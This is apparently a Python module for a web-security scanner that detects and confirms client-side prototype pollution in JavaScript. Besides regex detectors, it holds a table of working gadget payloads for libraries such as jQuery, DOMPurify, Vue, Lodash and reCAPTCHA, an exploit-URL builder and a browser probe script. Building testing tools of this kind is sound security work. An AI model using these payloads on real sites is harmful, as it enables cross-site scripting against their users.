"""
Prototype pollution detection module.
"""

import re
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, Iterable, List, Optional, Sequence, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit


class PollutionSource(Enum):
    """Prototype pollution source types."""
    MERGE = "merge"
    ASSIGN = "assign"
    CLONE = "clone"
    EXTEND = "extend"
    JQUERY_EXTEND = "jquery_extend"
    LODASH_MERGE = "lodash_merge"
    OBJECT_CREATE = "object_create"
    PROTO_ASSIGNMENT = "proto_assignment"
    CONSTRUCTOR_ASSIGNMENT = "constructor_assignment"


@dataclass
class ProtoPollutionAnalysis:
    """Prototype pollution analysis result."""
    has_pollution_sources: bool
    frameworks: List[str]
    pollution_sources: List[PollutionSource]
    has_gadget_chains: bool
    gadgets: List[str]
    confidence: float


class PrototypePollutionDetector:
    """
    Advanced prototype pollution detector.
    Detects prototype pollution vulnerabilities in JavaScript code.
    """

    # Framework detection patterns
    FRAMEWORK_PATTERNS = {
        'jQuery': re.compile(r'jquery[-.]?(\d+\.\d+\.\d+)', re.I),
        'Lodash': re.compile(r'lodash[-.]?(\d+\.\d+\.\d+)', re.I),
        'Underscore': re.compile(r'underscore[-.]?(\d+\.\d+\.\d+)', re.I),
        'Merge': re.compile(r'\.merge\s*\('),
        'Vue': re.compile(r'vue[-.]?(\d+\.\d+\.\d+)', re.I),
        'React': re.compile(r'react[-.]?(\d+\.\d+\.\d+)', re.I),
    }

    # Pollution source patterns
    POLLUTION_PATTERNS = {
        PollutionSource.MERGE: [
            r'(?:Object\s*\.\s*)?merge\s*\(',
            r'Object\s*\.\s*assign\s*\(',
        ],
        PollutionSource.JQUERY_EXTEND: [
            r'\$\.extend\s*\(',
            r'jQuery\.extend\s*\(',
        ],
        PollutionSource.LODASH_MERGE: [
            r'_\.merge\s*\(',
            r'lodash\.merge\s*\(',
        ],
        PollutionSource.PROTO_ASSIGNMENT: [
            r'\.__proto__\s*=',
            r'\[\s*"__proto__"\s*\]\s*=',
        ],
        PollutionSource.CONSTRUCTOR_ASSIGNMENT: [
            r'\.constructor\.prototype\s*=',
            r'\[\s*"constructor"\s*\]\.prototype\s*=',
        ],
    }

    # Known gadget chains
    GADGET_CHAINS = [
        'innerHTML',
        'outerHTML',
        'document.write',
        'eval',
        'Function',
        'setTimeout',
        'setInterval',
        'location',
        'document.cookie',
    ]

    # Vulnerable framework versions
    VULNERABLE_VERSIONS = {
        'jQuery': ['1.12.0', '1.12.1', '1.12.2', '1.12.3', '1.12.4'],
        'Lodash': ['4.17.11', '4.17.12', '4.17.13', '4.17.14', '4.17.15'],
    }

    def __init__(self):
        self._cache: Dict[str, ProtoPollutionAnalysis] = {}

    def detect_prototype_pollution(self, js_content: str, url: str = "") -> ProtoPollutionAnalysis:
        """
        Detect prototype pollution sources in JavaScript content.

        Args:
            js_content: JavaScript source code
            url: URL of the JavaScript file (for reporting)

        Returns:
            ProtoPollutionAnalysis with detailed findings
        """
        has_pollution_sources = False
        frameworks = []
        pollution_sources = []
        has_gadget_chains = False
        gadgets = []
        confidence = 0.0

        # Detect frameworks
        for name, pattern in self.FRAMEWORK_PATTERNS.items():
            if pattern.search(js_content):
                frameworks.append(name)

        # Detect pollution sources
        for source_type, patterns in self.POLLUTION_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, js_content):
                    pollution_sources.append(source_type)
                    has_pollution_sources = True

        # Check for gadget chains
        for gadget in self.GADGET_CHAINS:
            if gadget in js_content:
                gadgets.append(gadget)
                has_gadget_chains = True

        # Calculate confidence
        if has_pollution_sources:
            confidence = 0.5
            if has_gadget_chains:
                confidence += 0.3
            if frameworks:
                confidence += 0.2
            confidence = min(1.0, confidence)

        return ProtoPollutionAnalysis(
            has_pollution_sources=has_pollution_sources,
            frameworks=frameworks,
            pollution_sources=pollution_sources,
            has_gadget_chains=has_gadget_chains,
            gadgets=gadgets,
            confidence=round(confidence, 2)
        )

    def generate_test_payloads(self, analysis: ProtoPollutionAnalysis, marker: str) -> List[str]:
        """Generate prototype pollution test payloads."""
        payloads = []

        if not analysis.has_pollution_sources:
            return payloads

        # __proto__ pollution payload
        payloads.append(
            f'__proto__[pollution]=window.__xoxss_proto.push(\'{marker}\')'
        )

        # Constructor pollution
        payloads.append(
            f'constructor.prototype.pollution=window.__xoxss_proto.push(\'{marker}\')'
        )

        # Merge-based pollution
        payloads.append(
            f'{{"__proto__":{{"pollution":"window.__xoxss_proto.push(\'{marker}\')"}}}}'
        )

        # jQuery extend pollution
        if 'jQuery' in analysis.frameworks:
            payloads.append(
                f'{{"__proto__":{{"innerHTML":"<img src=x onerror=window.__xoxss_proto.push(\'{marker}\')>"}}}}'
            )

        # Lodash merge pollution
        if 'Lodash' in analysis.frameworks:
            payloads.append(
                f'{{"__proto__":{{"polluted":true,"innerHTML":"<img src=x onerror=window.__xoxss_proto.push(\'{marker}\')>"}}}}'
            )

        return payloads

    def check_gadget_chain(self, js_content: str, gadget: str) -> bool:
        """Check if a specific gadget chain exists."""
        return gadget in js_content

    def assess_framework_vulnerability(self, framework: str, version: str) -> bool:
        """Check if a framework version is vulnerable to prototype pollution."""
        if framework in self.VULNERABLE_VERSIONS:
            return version in self.VULNERABLE_VERSIONS[framework]
        return False

    def get_pollution_sink(self, js_content: str) -> Optional[str]:
        """Identify the primary pollution sink in the code."""
        sinks = {
            'Object.assign': r'Object\s*\.\s*assign\s*\(',
            'Object.merge': r'Object\s*\.\s*merge\s*\(',
            'jQuery.extend': r'\$\.extend\s*\(',
            'Lodash.merge': r'_\.merge\s*\(',
        }

        for sink, pattern in sinks.items():
            if re.search(pattern, js_content):
                return sink

        return None


# --------------------------------------------------------------------------------------
# Runtime verification
# --------------------------------------------------------------------------------------

# A client-side prototype pollution bug is only real when attacker-controlled input
# reaches a merge/assign sink.  Static source patterns are a useful hint, but they
# cannot prove that the application's parser accepts ``__proto__`` or that a gadget
# is present.  The helpers below drive a real browser and require a unique marker to
# appear on ``Object.prototype`` before anything is reported.

PROTO_MARKER_KEY = "xoxss"

# Query/fragment spellings used by common parsers (qs, jQuery.deparam, URLSearchParams
# wrappers, deep-merge helpers).  Bracket and dot notation are both covered; values
# are URL-encoded by ``urlencode`` and decoded by the target's parser.
PROBE_PARAMETERS: Tuple[Tuple[str, str], ...] = (
    ("__proto__[xoxss]", "query"),
    ("constructor[prototype][xoxss]", "query"),
    ("__proto__.xoxss", "query"),
    ("constructor.prototype.xoxss", "query"),
    ("__proto__[xoxss]", "fragment"),
    ("constructor[prototype][xoxss]", "fragment"),
)


def _merge_pairs(url: str, pairs: Sequence[Tuple[str, str]]) -> str:
    """Append query pairs without disturbing the existing path, query or fragment."""
    parts = urlsplit(url)
    merged = list(parse_qsl(parts.query, keep_blank_values=True))
    merged.extend((str(name), str(value)) for name, value in pairs)
    return urlunsplit(
        (parts.scheme, parts.netloc, parts.path, urlencode(merged, doseq=True), parts.fragment)
    )


def _merge_fragment(url: str, pairs: Sequence[Tuple[str, str]]) -> str:
    parts = urlsplit(url)
    addition = urlencode(list(pairs), doseq=True)
    fragment = parts.fragment
    if fragment:
        fragment = fragment + "&" + addition
    else:
        fragment = addition
    return urlunsplit((parts.scheme, parts.netloc, parts.path, parts.query, fragment))


@dataclass(frozen=True)
class ProtoProbe:
    """One way of delivering a prototype-pollution marker to the page."""

    parameter: str
    location: str

    def apply(self, url: str, marker: str) -> str:
        pairs = [(self.parameter, marker)]
        if self.location == "fragment":
            return _merge_fragment(url, pairs)
        return _merge_pairs(url, pairs)


def build_proto_probes(url: str, marker: str) -> List[Tuple[str, ProtoProbe]]:
    """Return concrete probe URLs for every supported pollution spelling."""
    probes: List[Tuple[str, ProtoProbe]] = []
    seen: Set[str] = set()
    for parameter, location in PROBE_PARAMETERS:
        probe = ProtoProbe(parameter=parameter, location=location)
        candidate = probe.apply(url, marker)
        if candidate in seen:
            continue
        seen.add(candidate)
        probes.append((candidate, probe))
    return probes


# ``{m}`` is replaced with an ``alert(...)`` call carrying a unique marker.  The
# browser hook records alerts as execution evidence, so a gadget that fires is
# confirmed rather than merely listed as a possibility.
@dataclass(frozen=True)
class PrototypeGadget:
    name: str
    exploit_pairs: Tuple[Tuple[str, str], ...]
    note: str = ""


GADGETS: Dict[str, PrototypeGadget] = {
    "jQuery": PrototypeGadget(
        "jQuery",
        (
            ("__proto__[url]", "data:,{m}//"),
            ("__proto__[dataType]", "script"),
        ),
        "jQuery ajax dataType script gadget",
    ),
    "jQuery-context": PrototypeGadget(
        "jQuery-context",
        (
            ("__proto__[context]", "<img src=x onerror={m}>"),
            ("__proto__[jquery]", "x"),
        ),
        "jQuery DOM manipulation context gadget",
    ),
    "DOMPurify": PrototypeGadget(
        "DOMPurify",
        (
            ("__proto__[ALLOWED_ATTR][0]", "onerror"),
            ("__proto__[ALLOWED_ATTR][1]", "src"),
        ),
        "DOMPurify allow-list pollution",
    ),
    "Vue": PrototypeGadget(
        "Vue",
        (
            ("__proto__[template]", "<img src=x onerror={m}>"),
            ("__proto__[v-if]", "_c.constructor('{m}')()"),
        ),
        "Vue template/compile gadget",
    ),
    "Lodash": PrototypeGadget(
        "Lodash",
        (
            ("__proto__[sourceURL]", "{m}"),
            ("__proto__[toString]", "x"),
        ),
        "Lodash merge/sourceURL gadget",
    ),
    "Knockout": PrototypeGadget(
        "Knockout",
        (
            ("__proto__[4]", "a':1,[{m}]:1,'b"),
            ("__proto__[5]", ","),
        ),
        "Knockout.js template parsing gadget",
    ),
    "Zepto": PrototypeGadget(
        "Zepto",
        (("__proto__[onerror]", "{m}"),),
        "Zepto element attribute gadget",
    ),
    "Popper": PrototypeGadget(
        "Popper",
        (
            ("__proto__[arrow][style]", "color:red;transition:all 1s"),
            ("__proto__[arrow][ontransitionend]", "{m}"),
        ),
        "Popper style/event gadget",
    ),
    "Closure": PrototypeGadget(
        "Closure",
        (("__proto__[CLOSURE_BASE_PATH]", "data:,{m}//"),),
        "Closure base-path script loader gadget",
    ),
    "i18next": PrototypeGadget(
        "i18next",
        (
            ("__proto__[lng]", "a"),
            ("__proto__[a]", "<img src=x onerror={m}>"),
        ),
        "i18next interpolation gadget",
    ),
    "Segment": PrototypeGadget(
        "Segment",
        (("__proto__[script][1]", "<img src=x onerror={m}>"),),
        "Segment analytics script injection gadget",
    ),
    "sanitize-html": PrototypeGadget(
        "sanitize-html",
        (("__proto__[*][]", "onload"),),
        "sanitize-html allow-list pollution",
    ),
    "js-xss": PrototypeGadget(
        "js-xss",
        (
            ("__proto__[whiteList][img][0]", "onerror"),
            ("__proto__[whiteList][img][1]", "src"),
        ),
        "js-xss white-list pollution",
    ),
    "reCAPTCHA": PrototypeGadget(
        "reCAPTCHA",
        (("__proto__[srcdoc][]", "<script>{m}</script>"),),
        "reCAPTCHA iframe srcdoc gadget",
    ),
    "Wistia": PrototypeGadget(
        "Wistia",
        (("__proto__[innerHTML]", "<img src=x onerror={m}>"),),
        "Wistia innerHTML gadget",
    ),
    "AMP": PrototypeGadget(
        "AMP",
        (("__proto__[ampUrlPrefix]", "https://example.invalid/"),),
        "AMP URL prefix gadget (manual validation required)",
    ),
}


def _alert_js(marker: str) -> str:
    safe = re.sub(r"[^A-Za-z0-9_-]", "", marker)[:64] or "xoxss"
    return f'alert("{safe}")'


def build_proto_exploit(
    url: str, gadget_name: str, marker: str
) -> Tuple[str, List[Tuple[str, str]]]:
    """Build a gadget-specific exploit URL for a confirmed pollution primitive."""
    gadget = GADGETS.get(gadget_name)
    if gadget is None:
        return "", []
    pairs = [
        (name, value.replace("{m}", _alert_js(marker)))
        for name, value in gadget.exploit_pairs
    ]
    return _merge_pairs(url, pairs), pairs


# Evaluated as a function expression in the page.  Both browser backends wrap it
# appropriately, and return a JSON-serialisable dict.
PROTO_PROBE_JS = r"""
(cfg) => {
  cfg = cfg || {};
  var marker = String(cfg.marker || '');
  var values = [];
  try { values.push(String(({}).xoxss || '')); } catch (e) {}
  try { values.push(String(({}).constructor.prototype.xoxss || '')); } catch (e) {}

  var gadgets = [];
  var seen = {};
  function add(name, version) {
    if (!name || seen[name]) { return; }
    seen[name] = true;
    gadgets.push({ name: String(name), version: version ? String(version) : '' });
  }
  try { if (window.jQuery && window.jQuery.fn) { add('jQuery', window.jQuery.fn.jquery); } } catch (e) {}
  try { if (window.DOMPurify) { add('DOMPurify', window.DOMPurify.version); } } catch (e) {}
  try { if (window.Vue) { add('Vue', window.Vue.version); } } catch (e) {}
  try { if (window._ && window._.template) { add('Lodash', window._.VERSION); } } catch (e) {}
  try { if (window.ko && window.ko.version) { add('Knockout', window.ko.version); } } catch (e) {}
  try { if (window.Zepto || (window.$ && window.$.zepto)) { add('Zepto', ''); } } catch (e) {}
  try { if (window.Popper) { add('Popper', window.Popper.VERSION || ''); } } catch (e) {}
  try { if (window.goog && window.goog.basePath) { add('Closure', ''); } } catch (e) {}
  try { if (window.i18next) { add('i18next', window.i18next.version); } } catch (e) {}
  try { if (window.analytics && window.analytics.SNIPPET_VERSION) { add('Segment', window.analytics.SNIPPET_VERSION); } } catch (e) {}
  try { if (window.sanitizeHtml) { add('sanitize-html', ''); } } catch (e) {}
  try { if (window.filterXSS) { add('js-xss', ''); } } catch (e) {}
  try { if (window.grecaptcha || window.recaptcha) { add('reCAPTCHA', ''); } } catch (e) {}
  try { if (window.Wistia) { add('Wistia', ''); } } catch (e) {}
  try { if (window.AMP) { add('AMP', ''); } } catch (e) {}
  try { if (window.google_tag_manager) { add('GTM', ''); } } catch (e) {}
  try { if (window.angular) { add('Angular', window.angular.version && window.angular.version.full); } } catch (e) {}
  try { if (window.Ember) { add('Ember', window.Ember.VERSION); } } catch (e) {}
  try { if (window.Backbone) { add('Backbone', window.Backbone.VERSION); } } catch (e) {}
  try { if (window.Marionette) { add('Marionette', ''); } } catch (e) {}
  try { if (window.bootstrap) { add('Bootstrap', ''); } } catch (e) {}

  return {
    polluted: values.indexOf(marker) !== -1,
    values: values,
    gadgets: gadgets
  };
}
"""


def gadget_exploit_names(gadgets: Iterable[Any]) -> List[str]:
    """Map browser fingerprint entries onto known exploit tables."""
    names: List[str] = []
    for item in gadgets:
        if isinstance(item, dict):
            name = str(item.get("name") or "")
        else:
            name = str(item or "")
        if not name:
            continue
        if name in GADGETS:
            names.append(name)
        elif name == "jQuery" and "jQuery-context" in GADGETS:
            names.append("jQuery")
    return list(dict.fromkeys(names))
